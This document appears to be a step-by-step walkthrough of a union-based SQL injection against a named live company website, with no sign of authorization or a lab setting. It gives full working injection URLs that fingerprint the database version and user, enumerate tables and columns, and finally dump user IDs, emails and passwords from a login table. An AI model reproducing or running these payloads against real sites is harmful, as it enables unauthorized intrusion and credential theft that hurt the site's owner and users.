## Introduction
#### Purpose of the Report
This walk-through demonstrates how to identify vulnerabilities, exploit them, and gain access to website, using error based SQL injection.

#### Target Website
https://bdfoods.com.bd/

#### Steps

##### Step 1 : view source source code

<img width="657" height="230" alt="image" src="https://github.com/user-attachments/assets/f998eec7-ba50-4074-8b9d-a2cacca5cd35" />

##### Step 02 : to check numbers of page availabe we are going to use order by 
- "order by 1" - "order by 2" - "order by 3" - "order by 4" -
- "order by 5" = error (means there no pages after 4).

url : https://bdfoods.com.bd/awards.php?id=9%20order%20by%201,%202,%203,%204
<img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/dacef368-ae81-4491-9798-a98e62ba7473" />


As all page looks preety much okay but..! 

##### Step 03 : to find the vulnerable web page, we are going to use union select 
- "union select 1,2,3,4"
- results in - page 3 is vulnerable.

url: https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,%203%20,%204
<img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/e18edaaa-b268-4520-a368-127ae593354e" />

##### Step 04 : version
url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,%20version()%20,%204
<img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/0ac1ce64-73b6-44ee-bcb7-82833c5d8367" />

##### Step 05 : username
bdgroup_foods@localhost 

url: https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,user(),%204
<img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/1bd29345-5235-470f-9e65-662d7518392a" />

##### Step 06 : database list of tables

url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,%202,table_name,%204%20from%20information_schema.tables
<img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/c90efc64-eff3-4d16-aaaa-03cc8c93330f" />
<img width="959" height="1049" alt="image" src="https://github.com/user-attachments/assets/a4be983b-f741-4284-8de5-0ebfe7adeb69" />
<img width="958" height="1051" alt="image" src="https://github.com/user-attachments/assets/d1757493-7252-4643-a971-95556d2ccaee" />

##### Step 07 : sorting the list of tables
 url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,2,table_name,4%20from%20information_schema.tables%20where%20table_schema%20=%20database()
<img width="958" height="1051" alt="image" src="https://github.com/user-attachments/assets/c6142966-5873-4152-aaea-4a5b688782cc" />

##### Step 08 : opening the u_log table.
url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,2,column_name,4%20from%20information_schema.columns%20where%20table_name%20=%20%27u_log%27
<img width="958" height="1051" alt="image" src="https://github.com/user-attachments/assets/f1adf4bb-fab9-4d2c-b79b-d8a4501db950" />

##### Step 09 : seeing all the content of u_log file.
url : https://bdfoods.com.bd/awards.php?id=9%20union%20select%201,2,group_concat(user_id,%200x0a,%20u_em,%200x0a,%20log__pass),4%20from%20u_log
<img width="958" height="1051" alt="image" src="https://github.com/user-attachments/assets/80b3764a-597c-4af0-b4db-9ebf80dab2cd" />
